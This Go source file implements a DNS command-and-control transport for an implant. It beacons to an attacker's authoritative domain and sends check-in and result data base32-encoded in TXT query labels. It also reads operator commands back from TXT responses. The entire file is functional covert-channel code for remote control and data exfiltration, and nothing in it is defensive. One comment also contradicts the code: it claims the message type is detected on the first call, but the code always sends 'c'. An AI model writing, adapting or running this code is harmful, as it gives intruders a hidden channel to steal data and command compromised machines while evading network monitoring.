// Package transport — dns.go
// Native DNS C2 transport: sends payload encoded in DNS TXT queries to an
// authoritative server, reads commands from TXT responses.
//
// Each query uses the format:
//   <base32(payload)>.<c2domain>  type TXT
//
// The base32 payload is split into 63-char labels joined by dots.
// Responses are base32-encoded TXT records re-assembled and decoded.
package transport

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

var dnsB32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// DNSClient implements C2 beaconing purely over DNS TXT queries.
type DNSClient struct {
	domain    string // authoritative zone, e.g. "c2.example.com"
	server    string // resolver address, e.g. "10.0.0.1:53"
	agentID   string
}

// NewDNSClient creates a DNS C2 transport.
// server is the authoritative server address ("host:port"); defaults to ":5353"
// if empty.
func NewDNSClient(domain, agentID, server string) *DNSClient {
	if server == "" {
		server = ":5353"
	}
	if !strings.Contains(server, ":") {
		server += ":53"
	}
	return &DNSClient{
		domain:  strings.TrimSuffix(domain, "."),
		server:  server,
		agentID: agentID,
	}
}

// SendData encodes payload as a DNS TXT query and sends it to the authoritative
// server. The payload type ("c" checkin or "r" result) is detected by whether
// this is the first call.
func (c *DNSClient) SendData(payload []byte) error {
	env := map[string]json.RawMessage{
		"t": json.RawMessage(`"c"`),
		"a": mustJSON(c.agentID),
		"d": payload,
	}
	b, err := json.Marshal(env)
	if err != nil {
		return err
	}
	_, err = c.query(b)
	return err
}

// PollCommand sends a poll query and returns the encoded command bytes, or nil
// when the server responds with "noop".
func (c *DNSClient) PollCommand() ([]byte, error) {
	env := map[string]json.RawMessage{
		"t": json.RawMessage(`"p"`),
		"a": mustJSON(c.agentID),
	}
	b, _ := json.Marshal(env)

	resp, err := c.query(b)
	if err != nil {
		return nil, err
	}
	if len(resp) == 0 {
		return nil, nil
	}

	var r struct {
		S string          `json:"s"`
		C json.RawMessage `json:"c,omitempty"`
	}
	if err := json.Unmarshal(resp, &r); err != nil {
		return nil, err
	}
	if r.S == "noop" || len(r.C) == 0 {
		return nil, nil
	}
	return r.C, nil
}

// query encodes payload into DNS labels, sends a TXT query, and decodes the
// TXT response back into bytes.
func (c *DNSClient) query(payload []byte) ([]byte, error) {
	encoded := dnsB32.EncodeToString(payload)
	labels := splitDNSLabels(encoded, 63)
	qname := strings.Join(labels, ".") + "." + c.domain + "."

	name, err := dnsmessage.NewName(qname)
	if err != nil {
		return nil, fmt.Errorf("dns name: %w", err)
	}

	msg := dnsmessage.Message{
		Header: dnsmessage.Header{
			ID:               uint16(time.Now().UnixNano()),
			RecursionDesired: false,
		},
		Questions: []dnsmessage.Question{{
			Name:  name,
			Type:  dnsmessage.TypeTXT,
			Class: dnsmessage.ClassINET,
		}},
	}
	pkt, err := msg.Pack()
	if err != nil {
		return nil, err
	}

	conn, err := net.DialTimeout("udp", c.server, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("dns dial: %w", err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write(pkt); err != nil {
		return nil, err
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}

	var resp dnsmessage.Message
	if err := resp.Unpack(buf[:n]); err != nil {
		return nil, err
	}

	var sb strings.Builder
	for _, ans := range resp.Answers {
		if txt, ok := ans.Body.(*dnsmessage.TXTResource); ok {
			for _, s := range txt.TXT {
				sb.WriteString(s)
			}
		}
	}
	if sb.Len() == 0 {
		return nil, nil
	}

	decoded, err := dnsB32.DecodeString(strings.ToUpper(sb.String()))
	if err != nil {
		return nil, fmt.Errorf("dns b32 decode: %w", err)
	}
	return decoded, nil
}

func splitDNSLabels(s string, maxLen int) []string {
	var out []string
	for len(s) > 0 {
		if len(s) <= maxLen {
			out = append(out, s)
			break
		}
		out = append(out, s[:maxLen])
		s = s[maxLen:]
	}
	return out
}

func mustJSON(v interface{}) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
